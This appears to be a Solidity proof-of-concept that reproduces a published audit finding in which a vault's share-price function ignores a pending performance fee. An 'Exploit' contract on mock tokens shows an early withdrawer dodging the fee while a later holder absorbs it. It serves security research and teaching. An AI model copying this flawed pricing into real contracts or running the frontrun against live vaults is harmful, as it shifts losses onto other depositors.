// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Polynomial Protocol — [H-05] Uneven deduction of performance fee causes some
    KangarooVault users to lose part of their token value
    (Code4rena 2023-03; finding #20228, reporter peakbolt)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground. The vulnerable
    KangarooVault.getTokenPrice open-position branch is inlined VERBATIM:

        uint256 totalValue = totalFunds + positionData.premiumCollected
                             + totalMargin + positionData.totalCollateral;
        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount));
        return totalValue.divWadDown(totalSupply);   // @> omits the pending
                                                     //    performanceFee

    ...alongside the verbatim _resetTrade, which DOES deduct the fee.

    Root cause: getTokenPrice counts the full premiumCollected as vault value
    but never subtracts the performanceFee that _resetTrade will charge on that
    premium. So while a position is open the share price is OVER-stated by
    exactly premiumCollected * performanceFee / totalSupply. A holder who exits
    before _resetTrade (i.e. before clearPendingCloseOrders) redeems at that
    inflated price and escapes the fee; the remaining holders bear the full fee
    at a lower price and are shortchanged.

    Harm class: mis-distribution / loss of token value for the late holder. No
    tokens are minted from thin air, so this is surfaced as a zero-profit
    INVARIANT: two holders deposit EQUAL amounts, yet the first-out holder
    redeems strictly more than the last-out holder, the gap equal to the fee.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal fixed-point helpers (solmate-compatible semantics).
library FixedPointMathLib {
    uint256 internal constant WAD = 1e18;

    function mulWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * y) / WAD;
    }

    function divWadDown(uint256 x, uint256 y) internal pure returns (uint256) {
        return (x * WAD) / y; // reverts on y == 0 (Solidity 0.8 panic)
    }
}

/// @dev Minimal ERC20 (sUSD), the vault's underlying / LP capital.
contract MockERC20 {
    string public name = "Synthetic USD";
    string public symbol = "sUSD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev SafeTransferLib shim so _resetTrade compiles verbatim.
library SafeTransferLib {
    function safeTransfer(MockERC20 token, address to, uint256 amt) internal {
        token.transfer(to, amt);
    }
}

/// @dev Minimal Exchange — only getMarkPrice() is consumed by getTokenPrice.
contract Exchange {
    uint256 public markPrice;

    constructor(uint256 _markPrice) {
        markPrice = _markPrice;
    }

    function getMarkPrice() external view returns (uint256, bool) {
        return (markPrice, false);
    }
}

/// @dev Minimal perp market — remainingMargin / transferMargin used by
///      getTokenPrice and _resetTrade. Reduced to zero margin.
contract PerpMarket {
    function remainingMargin(address) external pure returns (uint256, bool) {
        return (0, false);
    }

    function transferMargin(int256) external {}
}

/// @notice Reduced KangarooVault. Holds a share token and computes share price
///         via the verbatim vulnerable getTokenPrice; realizes the performance
///         fee via the verbatim _resetTrade.
contract KangarooVault {
    using FixedPointMathLib for uint256;
    using SafeTransferLib for MockERC20;

    struct PositionData {
        uint256 positionId;
        uint256 shortAmount;
        uint256 totalCollateral;
        uint256 premiumCollected;
        uint256 totalMargin;
    }

    PositionData public positionData;

    MockERC20 public SUSD;
    Exchange public EXCHANGE;
    PerpMarket public PERP_MARKET;

    uint256 public totalFunds;
    uint256 public usedFunds;
    uint256 public performanceFee;
    address public feeReceipient;
    address public owner;

    // share token
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(MockERC20 _susd, Exchange _exchange, PerpMarket _perp, address _feeReceipient) {
        owner = msg.sender;
        SUSD = _susd;
        EXCHANGE = _exchange;
        PERP_MARKET = _perp;
        feeReceipient = _feeReceipient;
    }

    function getTotalSupply() public view returns (uint256) {
        return totalSupply;
    }

    /// @dev Test seed: install an open-position state with premium collected and
    ///      mint EQUAL shares to two holders (a reduction of two equal deposits
    ///      followed by a profitable premium collection).
    function seed(
        uint256 totalFunds_,
        uint256 premium_,
        uint256 performanceFee_,
        address user2,
        address user3,
        uint256 sharesEach
    ) external {
        require(msg.sender == owner, "AUTH");
        totalFunds = totalFunds_;
        positionData.positionId = 1; // position is OPEN
        positionData.premiumCollected = premium_;
        performanceFee = performanceFee_;
        balanceOf[user2] = sharesEach;
        balanceOf[user3] = sharesEach;
        totalSupply = sharesEach * 2;
    }

    /// @notice VERBATIM reduction of KangarooVault.getTokenPrice.
    function getTokenPrice() public view returns (uint256) {
        if (totalFunds == 0) {
            return 1e18;
        }

        uint256 totalSupply_ = getTotalSupply();
        if (positionData.positionId == 0) {
            return totalFunds.divWadDown(totalSupply_);
        }

        uint256 totalMargin;

        (uint256 markPrice, bool isInvalid) = EXCHANGE.getMarkPrice();
        require(!isInvalid);
        (totalMargin, isInvalid) = PERP_MARKET.remainingMargin(address(this));
        require(!isInvalid);

        uint256 totalValue = totalFunds + positionData.premiumCollected + totalMargin + positionData.totalCollateral;
        totalValue -= (usedFunds + markPrice.mulWadDown(positionData.shortAmount)); // @> VULN: never subtracts premiumCollected.mulWadDown(performanceFee)

        return totalValue.divWadDown(totalSupply_);
    }

    /// @notice Redeem all of `user`'s shares at the CURRENT token price.
    function withdraw(address user) external returns (uint256 payout) {
        uint256 shares = balanceOf[user];
        uint256 price = getTokenPrice();
        payout = shares.mulWadDown(price);

        balanceOf[user] = 0;
        totalSupply -= shares;
        totalFunds -= payout; // withdrawal reduces the vault's fund accounting

        SUSD.transfer(user, payout);
    }

    /// @notice VERBATIM reduction of KangarooVault._resetTrade — realizes the
    ///         premium into totalFunds and charges the performanceFee.
    function resetTrade() external {
        require(msg.sender == owner, "AUTH");
        _resetTrade();
    }

    function _resetTrade() internal {
        positionData.positionId = 0;
        (uint256 totalMargin,) = PERP_MARKET.remainingMargin(address(this));
        PERP_MARKET.transferMargin(-int256(totalMargin));
        usedFunds -= totalMargin;

        uint256 fees = positionData.premiumCollected.mulWadDown(performanceFee);
        if (fees > 0) SUSD.safeTransfer(feeReceipient, fees);

        totalFunds += positionData.premiumCollected - fees;
        totalFunds -= usedFunds;

        positionData.premiumCollected = 0;
        positionData.totalMargin = 0;
        usedFunds = 0;
    }
}

/// @dev Orchestrator: two holders deposit EQUAL value; a profit (premium) is
///      collected on an open position; holder 2 exits BEFORE the fee is charged
///      (inflated price) and holder 3 exits AFTER (lower price). Proves holder 3
///      is shortchanged by the entire fee that holder 2 evaded.
contract Exploit {
    // 1e18 == one unit
    uint256 public constant DEPOSIT_EACH = 10e18; // each holder's deposit / shares
    uint256 public constant PREMIUM = 10e18; // premium (profit) collected while open
    uint256 public constant PERF_FEE = 0.2e18; // 20% performance fee
    // Pre-attack, position-open state:
    uint256 public constant TOTAL_FUNDS = 20e18; // both deposits
    // Vault holds deposits + realized premium in sUSD:
    uint256 public constant VAULT_SUSD = 30e18;

    address public constant USER2 = 0x0000000000000000000000000000000000002222; // frontrunner (exits first)
    address public constant USER3 = 0x0000000000000000000000000000000000003333; // victim (exits last)
    address public constant FEE_SINK = 0x000000000000000000000000000000000000Fee5;

    MockERC20 public susd;
    Exchange public exchange;
    PerpMarket public perp;
    KangarooVault public vault;

    uint256 public payout2;
    uint256 public payout3;

    constructor() {
        susd = new MockERC20(); // CREATE nonce 1
        exchange = new Exchange(1e18); // CREATE nonce 2 (markPrice = 1.0)
        perp = new PerpMarket(); // CREATE nonce 3
        vault = new KangarooVault(susd, exchange, perp, FEE_SINK); // CREATE nonce 4 (vulnerable)

        // Fund the vault with deposits (20) + already-collected premium (10).
        susd.mint(address(vault), VAULT_SUSD);
        // Install the open-position state: equal shares for both holders.
        vault.seed(TOTAL_FUNDS, PREMIUM, PERF_FEE, USER2, USER3, DEPOSIT_EACH);
    }

    function run() external {
        // Baseline: both holders staked equal value (10e18 each), equal shares.
        require(vault.balanceOf(USER2) == DEPOSIT_EACH, "u2 shares");
        require(vault.balanceOf(USER3) == DEPOSIT_EACH, "u3 shares");

        // Price while the position is OPEN (fee NOT subtracted): (20+10)/20 = 1.5.
        uint256 priceOpen = vault.getTokenPrice();
        require(priceOpen == 1.5e18, "open price wrong");

        // Holder 2 frontruns the fee charge and exits at the inflated price.
        payout2 = vault.withdraw(USER2); // 10 * 1.5 = 15e18

        // Now the position closes and _resetTrade charges the performance fee
        // and realizes the premium into totalFunds.
        vault.resetTrade();

        // Price after reset (positionId == 0 branch): totalFunds/totalSupply.
        uint256 priceAfter = vault.getTokenPrice(); // 13/10 = 1.3e18
        require(priceAfter == 1.3e18, "post-reset price wrong");

        // Holder 3 exits at the lower price.
        payout3 = vault.withdraw(USER3); // 10 * 1.3 = 13e18

        // === HARM ===
        uint256 fee = (PREMIUM * PERF_FEE) / 1e18; // 2e18

        // Both holders deposited the SAME value and held the SAME shares, yet:
        require(payout2 == 15e18, "payout2");
        require(payout3 == 13e18, "payout3");
        require(payout2 > payout3, "no uneven distribution");

        // The gap is exactly the performance fee: holder 2 escaped it entirely
        // and holder 3 bore all of it (fair would be 14e18 each).
        require(payout2 - payout3 == fee, "gap != fee");
        require(payout3 < 14e18, "victim not shortchanged");
        require(payout2 > 14e18, "frontrunner did not evade fee");

        // The fee sink got the whole fee; the vault is emptied.
        require(susd.balanceOf(FEE_SINK) == fee, "fee not taken");
        require(susd.balanceOf(address(vault)) == 0, "vault not emptied");
    }
}
